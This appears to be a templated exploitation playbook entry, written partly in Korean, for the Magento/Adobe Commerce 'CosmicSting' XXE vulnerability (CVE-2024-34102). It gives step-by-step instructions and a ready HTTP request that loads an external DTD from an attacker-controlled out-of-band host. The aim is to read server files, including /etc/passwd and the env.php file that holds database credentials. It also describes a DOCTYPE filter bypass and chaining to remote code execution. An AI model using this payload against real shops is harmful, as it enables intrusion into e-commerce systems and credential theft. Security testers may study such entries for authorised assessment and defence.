---
name: cve_2024_34102_magento_cosmicsting_xxe
vuln_type: xxe
sub_technique: rest_api_json_xml_doctype_bypass
category: exploitation
safety_level: cautious
source: cve
cve_id: CVE-2024-34102
cwe: CWE-611
frameworks:
  - magento
  - adobe_commerce
  - laminas
affected_versions:
  - "Magento 2.4.7-p1 미만"
  - "Adobe Commerce 2.4.7-p1 / 2.4.6-p6 / 2.4.5-p8 / 2.4.4-p9 미만"
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-34102
  - https://sansec.io/research/cosmicsting
tags:
  - xxe
  - magento
  - rest_api
  - json_to_xml
  - oob
---

# CVE-2024-34102 — Magento CosmicSting XXE (REST API JSON→XML)

## When to Apply

대상에 Magento 2 / Adobe Commerce 의 `/rest/V1/guest-carts/<cart_id>/estimate-shipping-methods`
같은 REST endpoint가 노출되고 응답 헤더에 `Magento` 흔적이 보일 때.
Content-Type을 application/xml로 변경하면 Laminas serializer가 XML을 그대로 파싱하면서
DOCTYPE 필터를 우회 (`\u0044OCTYPE` JSON unicode escape 가능).

## Prerequisites

- Magento 2 / Adobe Commerce REST API 노출
- 외부 OOB endpoint 접근 가능 (file://, gopher://, http://)
- guest-cart 또는 게스트 endpoint로 인증 우회 가능

## Steps

1. POST /rest/V1/guest-carts/<cart_id>/estimate-shipping-methods 로 정상 JSON 보내 cart_id 확보.
2. Content-Type: application/xml 로 바꿔 같은 endpoint에 XXE payload 전송.
3. 외부 DTD 로드 (`file://`, `http://attacker/oob.dtd`) 로 OOB 파일 읽기.
4. /etc/passwd, env, app/etc/env.php (Magento DB 자격증명) 추출 후 다음 단계 chain.

## Code Template

```http
POST /rest/V1/guest-carts/{{cart_id}}/estimate-shipping-methods HTTP/1.1
Host: {{target}}
Content-Type: application/xml

<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://{{oob_host}}/exfil.dtd">
  %ext;
]>
<root/>
```

## Examples

### Example 1

- **target**: `magento-2.4.6.com`
- **oob_path**: `file:///etc/passwd`

Magento CosmicSting 원본 PoC. JSON DOCTYPE 필터를 `\u0044` unicode escape 로 우회 가능.
RCE까지는 CVE-2024-2961 (CNEXT glibc iconv overflow)와 chain.
